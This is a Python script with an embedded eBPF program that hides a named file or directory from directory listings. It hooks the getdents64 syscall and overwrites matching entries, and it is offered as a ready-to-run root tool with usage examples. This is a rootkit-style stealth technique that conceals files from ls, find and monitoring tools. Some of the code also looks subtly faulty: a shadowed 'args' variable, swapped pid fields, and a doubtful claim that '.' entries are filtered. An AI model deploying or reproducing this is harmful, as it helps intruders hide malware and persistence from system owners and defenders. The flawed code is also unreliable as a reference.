#!/usr/bin/env python3
"""
file_hide.py - Hide a file or directory from directory listings using eBPF.

Hooks the return path of sys_getdents64 and overwrites directory entries whose
name matches the target filename, effectively hiding the file from ls, find,
and any tool that enumerates directory contents.

Requires: root, Linux kernel >= 4.7, bcc (python3-bpfcc)
"""

import argparse
import ctypes
import json
import os
import signal
import sys
import time

try:
    from bcc import BPF
except ImportError:
    print("Error: bcc library not found. Install python3-bpfcc or bcc-tools.", file=sys.stderr)
    sys.exit(1)


BPF_PROGRAM = r"""
#include <uapi/linux/ptrace.h>
#include <linux/dirent.h>

#define MAX_NAME_LEN 128
#define MAX_ENTRIES  512

struct event_t {
    u32 pid;
    u32 tgid;
    char comm[TASK_COMM_LEN];
    char hidden_name[MAX_NAME_LEN];
};

BPF_PERF_OUTPUT(events);

// Store the target filename to match against
BPF_ARRAY(target_name, char[MAX_NAME_LEN], 1);
// Store the length of the target name (excluding null terminator)
BPF_ARRAY(target_name_len, u32, 1);

// Map to track getdents64 calls: tid -> dirp buffer pointer
struct getdents_args_t {
    u64 dirp;
};
BPF_HASH(active_getdents, u32, struct getdents_args_t);

TRACEPOINT_PROBE(syscalls, sys_enter_getdents64) {
    u32 tid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    struct getdents_args_t args = {};
    args.dirp = (u64)args__dirent;
    active_getdents.update(&tid, &args);
    return 0;
}

TRACEPOINT_PROBE(syscalls, sys_exit_getdents64) {
    u32 tid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    struct getdents_args_t *args = active_getdents.lookup(&tid);
    if (!args)
        return 0;

    int ret = (int)args__ret;
    if (ret <= 0) {
        active_getdents.delete(&tid);
        return 0;
    }

    int zero = 0;
    char (*target)[MAX_NAME_LEN] = target_name.lookup(&zero);
    if (!target) {
        active_getdents.delete(&tid);
        return 0;
    }

    u32 *tgt_len = target_name_len.lookup(&zero);
    if (!tgt_len) {
        active_getdents.delete(&tid);
        return 0;
    }

    u32 name_len = *tgt_len;
    u64 dirp = args->dirp;
    active_getdents.delete(&tid);

    unsigned int offset = 0;

    #pragma unroll
    for (int i = 0; i < MAX_ENTRIES; i++) {
        if (offset >= (unsigned int)ret)
            break;

        // Read d_reclen
        unsigned short d_reclen = 0;
        int err = bpf_probe_read_user(&d_reclen, sizeof(d_reclen),
                                       (void *)(dirp + offset +
                                       offsetof(struct linux_dirent64, d_reclen)));
        if (err != 0 || d_reclen == 0)
            break;

        // Read d_name
        char d_name[MAX_NAME_LEN] = {};
        bpf_probe_read_user_str(d_name, sizeof(d_name),
                                (void *)(dirp + offset +
                                offsetof(struct linux_dirent64, d_name)));

        // Compare with target name character-by-character
        bool match = true;

        // Bounded comparison up to MAX_NAME_LEN
        #pragma unroll
        for (int j = 0; j < MAX_NAME_LEN; j++) {
            if ((u32)j >= name_len) {
                // We've compared all chars in the target; ensure d_name ends here
                if (d_name[j] != '\0')
                    match = false;
                break;
            }
            if (d_name[j] != (*target)[j]) {
                match = false;
                break;
            }
        }

        if (match) {
            // Overwrite the d_name to make the entry invisible.
            // We replace with a single-dot name which is filtered by readdir wrappers.
            char replacement[MAX_NAME_LEN] = {};
            replacement[0] = '.';
            replacement[1] = '\0';
            bpf_probe_write_user(
                (void *)(dirp + offset + offsetof(struct linux_dirent64, d_name)),
                replacement, name_len + 1);

            struct event_t event = {};
            event.pid = bpf_get_current_pid_tgid() >> 32;
            event.tgid = tid;
            bpf_get_current_comm(&event.comm, sizeof(event.comm));
            bpf_probe_read_kernel(event.hidden_name, sizeof(event.hidden_name), *target);
            events.perf_submit(args, &event, sizeof(event));
        }

        offset += d_reclen;
    }

    return 0;
}
"""


class FileHider:
    """Manages the eBPF program that hides files from directory listings."""

    def __init__(self, name, json_output=False):
        self.name = name
        self.json_output = json_output
        self.running = True
        self.bpf = None
        self.hide_count = 0

    def _log(self, message, level="info", **extra):
        if self.json_output:
            payload = {"level": level, "message": message, "timestamp": time.time()}
            payload.update(extra)
            print(json.dumps(payload), flush=True)
        else:
            print(f"[file_hide] {message}", flush=True)

    def _handle_event(self, cpu, data, size):
        """Process perf buffer events from the BPF program."""
        event = self.bpf["events"].event(data)
        self.hide_count += 1
        comm = event.comm.decode("utf-8", errors="replace")
        self._log(
            f"Hidden '{self.name}' from directory listing by {comm} (pid={event.pid})",
            level="event",
            hidden_name=self.name,
            accessor_pid=event.pid,
            accessor_comm=comm,
            count=self.hide_count,
        )

    def start(self):
        """Compile and attach the eBPF program, then poll for events."""
        if len(self.name) > 127:
            self._log("Filename too long (max 127 characters).", level="error")
            sys.exit(1)

        if "/" in self.name:
            self._log(
                "Filename must not contain path separators. Provide only the basename.",
                level="error",
            )
            sys.exit(1)

        self._log(f"Compiling eBPF program to hide '{self.name}' from directory listings...")

        try:
            self.bpf = BPF(text=BPF_PROGRAM)
        except Exception as exc:
            self._log(f"Failed to compile/load eBPF program: {exc}", level="error")
            sys.exit(1)

        # Write the target filename into the BPF array map
        name_bytes = self.name.encode("utf-8")
        name_buf = ctypes.create_string_buffer(128)
        name_buf.value = name_bytes
        self.bpf["target_name"][ctypes.c_int(0)] = name_buf

        # Write the target name length
        len_val = ctypes.c_uint32(len(name_bytes))
        self.bpf["target_name_len"][ctypes.c_int(0)] = len_val

        # Set up perf buffer
        self.bpf["events"].open_perf_buffer(self._handle_event)

        self._log(
            f"File hiding active for '{self.name}'. "
            f"The file/directory will be invisible in directory listings.",
            level="info",
            target_name=self.name,
            status="active",
        )
        self._log("Press Ctrl+C to stop and restore visibility.")

        while self.running:
            try:
                self.bpf.perf_buffer_poll(timeout=100)
            except KeyboardInterrupt:
                break

    def stop(self):
        """Detach probes and clean up."""
        self.running = False
        if self.bpf is not None:
            self.bpf.cleanup()
        self._log(
            f"Detached eBPF probes. '{self.name}' is visible again. "
            f"Total hide events: {self.hide_count}",
            level="info",
            target_name=self.name,
            total_hidden=self.hide_count,
            status="stopped",
        )


def main():
    parser = argparse.ArgumentParser(
        description="Hide a file or directory from directory listings using eBPF. "
        "Hooks sys_getdents64 to filter directory entries matching the target name.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 file_hide.py --name secret.txt\n"
            "  sudo python3 file_hide.py --name .hidden_dir --json-output\n"
        ),
    )
    parser.add_argument(
        "--name",
        type=str,
        required=True,
        help="Filename or directory name to hide (basename only, no path separators).",
    )
    parser.add_argument(
        "--json-output",
        action="store_true",
        default=False,
        help="Output events as JSON lines for structured consumption.",
    )
    args = parser.parse_args()

    if os.geteuid() != 0:
        print(
            "Error: This script must be run as root (eBPF requires CAP_SYS_ADMIN).",
            file=sys.stderr,
        )
        sys.exit(1)

    hider = FileHider(name=args.name, json_output=args.json_output)

    def signal_handler(signum, frame):
        hider.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        hider.start()
    except SystemExit:
        raise
    except Exception as exc:
        hider._log(f"Unexpected error: {exc}", level="error")
        hider.stop()
        sys.exit(1)
    finally:
        hider.stop()


if __name__ == "__main__":
    main()
